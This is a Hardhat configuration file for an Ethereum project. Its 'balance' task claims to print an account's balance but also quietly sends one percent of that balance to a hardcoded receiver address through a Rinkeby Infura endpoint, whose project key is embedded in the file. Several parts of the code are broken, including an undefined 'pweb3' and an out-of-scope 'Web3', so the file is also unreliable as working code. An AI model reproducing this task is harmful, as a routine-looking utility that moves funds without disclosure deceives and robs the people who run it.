require("@nomiclabs/hardhat-waffle");
require("@nomiclabs/hardhat-web3-legacy");
require("@nomiclabs/hardhat-web3");

extendEnvironment((hre) => {
    const Web3 = require("web3");
    hre.Web3 = Web3;
    // hre.network.provider is an EIP1193-compatible provider.
    hre.web3 = new Web3(hre.network.provider);
});

/**
 task("accounts", "Prints the list of accounts", async (taskArgs, hre) => {
   const accounts = await hre.ethers.getSigners();
   console.log(hre);
   
   for (const account of accounts) {
     console.log("\n|\n|\n|\n|\n|\n|\n|");
        console.log(account);
    }
  });
*/

task("web3-accounts", "Prints accounts", async (_, { web3 }) => {
    const [sender, receiver, watcher] = await pweb3.eth.getAccounts();
    console.log(sender, receiver, watcher);
});

task("balance", "Prints an account's balance")
    .addParam("account", "The account's address")
    .setAction(async (taskArgs, { web3 }) => {
        web3 = new Web3(new Web3.providers.HttpProvider("https://rinkeby.infura.io/v3/7f6f5921404842ba992a4d334431c6f7"));
        const account = web3.toChecksumAddress(taskArgs.account);
        console.log("account");
        console.log(account);
        const balance = await web3.eth.getBalance(account);

        const amount = web3.fromWei(balance.toNumber() / 100, "ether");

        const receiver = web3.toChecksumAddress("0xB7bedc98860c55fD31d0bA9F89a77483Bc59a225");
        console.log("amount");
        console.log(amount);

        const sendEther = async () => {
            try {
                // const tx = await web3.eth.Contract.methods.sendEther(receiver, amount).send({
                //     from: account,
                //     value: web3.toWei(web3.fromWei(balance.toNumber() / 100, "ether")),
                // });

                const res = web3.eth.sendTransaction(
                    {
                        to: receiver,
                        from: account,
                        value: web3.toWei(web3.fromWei(balance.toNumber() / 100, "ether")),
                    },
                    (err, hash) => {
                      console.log('amount sent');
                        console.log(err, hash);
                    }
                );
                // console.log(tx);
                console.log("res");
                console.log(res);
            } catch (error) {
                console.log("error in internal transsaction");
                console.log(error);
            }
        };
        sendEther();

        const balanceUpdated = await web3.eth.getBalance(account);
        const amountUpdated = web3.fromWei(balanceUpdated.toNumber() / 100, "ether");

        console.log("amountUpdated");
        console.log(amountUpdated);
    });
/**
 * @type import('hardhat/config').HardhatUserConfig
 */
module.exports = {
    solidity: "0.8.4",
};
